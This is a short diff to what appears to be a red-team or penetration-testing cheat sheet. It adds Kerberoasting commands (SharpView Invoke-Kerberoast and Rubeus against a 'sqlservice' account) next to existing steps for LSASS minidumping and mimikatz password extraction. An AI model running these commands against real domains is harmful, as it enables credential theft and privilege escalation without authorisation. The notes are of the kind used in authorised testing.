@@ -73,6 +73,10 @@ Lateral Movement
   verify no powershell is running
   
 PrivEsc
+  Kerberoast (Request SPN and get the TGS for offline cracking)
+    SharpView.exe Invoke-Kerberoast (optional: -Domain:dom.fqdn -Server:DC.fqdn)
+    Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
+
   MiniDump - Offline PW dump
     .\createminidump.exe
     .\mimikatz.exe
